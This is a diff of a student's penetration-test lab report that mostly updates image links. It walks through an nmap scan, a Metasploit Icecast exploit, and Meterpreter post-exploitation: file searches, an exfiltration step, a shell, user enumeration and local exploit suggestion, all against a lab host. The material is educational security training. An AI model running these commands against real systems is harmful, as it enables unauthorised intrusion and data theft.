@@ -2,7 +2,8 @@
 
 
 > Written with [StackEdit](https://stackedit.io/).
-GoodSecurity Penetration Test Report
+# GoodSecurity Penetration Test Report-2  WEEK-17
+
 
   
 
@@ -92,11 +93,18 @@ Some remote HACKING able to be executed are:
 **Severity:**
 ##### -In your expert opinion, how severe is this vulnerability?
 > Answer: Severity= 7.5
-![CVE Details](C:%5CUsers%5Chjavid%5CPictures%5CForHW-15%5C16-HW)
+
+
+![CVE Details](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/CVE%20Details.PNG)
+
+
+
 
 
 > Answer: Severity=8.1
-![Severity-NVD](C:%5CUsers%5Chjavid%5CPictures%5CForHW-15%5C16-HW)
+
+
+![Severity-NVD](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/Severity-NVD.PNG)
 
 
 ## Proof of Concept:
@@ -112,75 +120,145 @@ We've been provided full access to the network and are getting ping responses fr
     - Run the Nmap command that performs a service and version scan against the target.
 
       > Answer: `nmap -sS -O -sV 192.168.0.20 `
- ![b1](C:%5CUsers%5Chjavid%5CPictures%5CForHW-15%5C16-HW)
+
+ ![b1](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/b1.jpg)
+ 
+ 
  
 2. From the previous step, we see that the Icecast service is running. Let's start by attacking that service. Search for any Icecast exploits:
  
    - Run the SearchSploit commands to show available Icecast exploits.
   
      > Answer: `searchsploit -t Icecast windows`
-![b2](C:%5CUsers%5Chjavid%5CPictures%5CForHW-15%5C16-HW)
+
+
+![b2](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/b2.PNG)
+
+
+
+
 3. Now that we know which exploits are available to us, let's start Metasploit:
  
    - Run the command that starts Metasploit:
     
      > Answer: `msfconsole`
- ![b3](C:%5CUsers%5Chjavid%5CPictures%5CForHW-15%5C16-HW)
+
+
+ ![b3](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/b3.PNG)
+ 
+ 
+ 
  
 4. Search for the Icecast module and load it for use.
  
    - Run the command to search for the Icecast module:
      
      > Answer: msf5 > `search Icecast`
- ![b4](C:%5CUsers%5Chjavid%5CPictures%5CForHW-15%5C16-HW)
+
+
+ ![b4](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/b4-note.PNG)
+
+
 
    - Run the command to use the Icecast module:
 
        **Note:** Instead of copying the entire path to the module, you can use the number in front of it.
 
      > Answer: msf5 > `use 0`
- ![b4-note](C:%5CUsers%5Chjavid%5CPictures%5CForHW-15%5C16-HW)
+
+
+ ![b4-note](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/b4-note.PNG)
+ 
+ 
+ 
  
 5. Set the `RHOST` to the target machine.
  
    - Run the command that sets the `RHOST`: 
       
      > Answer:  `set RHOSTS 192.168.0.20`
- ![b5](C:%5CUsers%5Chjavid%5CPictures%5CForHW-15%5C16-HW)
+
+
+ ![b5](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/b5.PNG)
+ 
+ 
+ 
+ 
+ 
+ 
 6. Run the Icecast exploit.
  
    - Run the command that runs the Icecast exploit.
       
      > Answer: `exploit`
- ![b6-1](C:%5CUsers%5Chjavid%5CPictures%5CForHW-15%5C16-HW)
+
+
+ ![b6-1](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/b6-1.PNG)
+ 
+ 
+ 
+ 
    - Run the command that performs a search for the `secretfile.txt` on the target.
       
      > Answer: `search -f *secret*.txt`
- ![b6-2](C:%5CUsers%5Chjavid%5CPictures%5CForHW-15%5C16-HW) 
+
+
+ ![b6-2](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/b6-2.PNG) 
+ 
+ 
+ 
+ 
  
  7. You should now have a Meterpreter session open.
  
     - Run the command to performs a search for the `recipe.txt` on the target:
 
       > Answer:  `search -f *recipe.txt*`
- ![b7-1](C:%5CUsers%5Chjavid%5CPictures%5CForHW-15%5C16-HW)
+
+
+ ![b7-1](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/b7-1.PNG)
+ 
+ 
+ 
+ 
  
     - **Bonus**: Run the command that exfiltrates the `recipe*.txt` file:
 
 
       > Answer:  `search -f *recipe*.txt*`
- ![b7-2](C:%5CUsers%5Chjavid%5CPictures%5CForHW-15%5C16-HW)
+      
+      
+ ![b7-2](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/b7-2.PNG)
+ 
+ 
+ 
+ 
+ 
+ 
  - **Bonus2(By-me)**:
- - ![meterpreter>shell](C:%5CUsers%5Chjavid%5CPictures%5CForHW-15%5C16-HW)
- - ![Drink-Recipe](C:%5CUsers%5Chjavid%5CPictures%5CForHW-15%5C16-HW)
- - ![Password.txt](C:%5CUsers%5Chjavid%5CPictures%5CForHW-15%5C16-HW)
- - ![Secretfile](C:%5CUsers%5Chjavid%5CPictures%5CForHW-15%5C16-HW)
+
+
+ - ![meterpreter>shell](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/meterpreter-shell.PNG)
+ - ![Drink-Recipe](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/Drink-RECIPE.PNG)
+ - ![Password.txt](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/PASSWD.PNG)
+ - ![Secretfile](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/Secretfile.PNG)
+
+
+
+
 
 
 8. You can also use Meterpreter's local exploit suggester to find possible exploits.
   > Answer: meterpreter > `run post/multi/recon/local_exploit_suggester`
- ![b8](C:%5CUsers%5Chjavid%5CPictures%5CForHW-15%5C16-HW)
+
+
+ ![b8](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/b8.PNG)
    - **Note:** The exploit suggester is just that: a suggestion. Keep in mind that the listed suggestions may not include all available exploits.
+
+
+
+
+
 
  
 #### Bonus
@@ -189,18 +267,34 @@ We've been provided full access to the network and are getting ping responses fr
 A. Run a Meterpreter post script that enumerates all logged on users.
 
   > Answer: meterpreter > `run post/windows/gather/enum_logged_on_users`
- ![Bonus-A](C:%5CUsers%5Chjavid%5CPictures%5CForHW-15%5C16-HW)
+
+
+ ![Bonus-A](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/Bonus-A.PNG)
+ 
+ 
+ 
+ 
      
 B. Open a Meterpreter shell and gather system information for the target.
+
+
  
-  > Answer:  meterpreter > `shell `![Bonus-B-1(shell)](C:%5CUsers%5Chjavid%5CPictures%5CForHW-15%5C16-HW)
+  > Answer:  meterpreter > `shell `![Bonus-B-1(shell)](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/Bonus-B-1.PNG)
+
+
      
-  > Answer:  meterpreter > `sysinfo `![Bonus-sysinfo](C:%5CUsers%5Chjavid%5CPictures%5CForHW-15%5C16-HW)
+  > Answer:  meterpreter > `sysinfo `![Bonus-sysinfo](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/sysinfo.PNG)
+
+
+
+
 
 C. Run the command that displays the target's computer system information:
 
    > Answer: `systeminfo`
-![Bonus-c](C:%5CUsers%5Chjavid%5CPictures%5CForHW-15%5C16-HW)
+
+
+![Bonus-c](https://github.com/H-JAVID/JAVID_UCB-Submitted-Home-work/blob/main/WEEK17-Homework/17-Hw-IMAGES/Bonus-c.PNG)
 
 
 
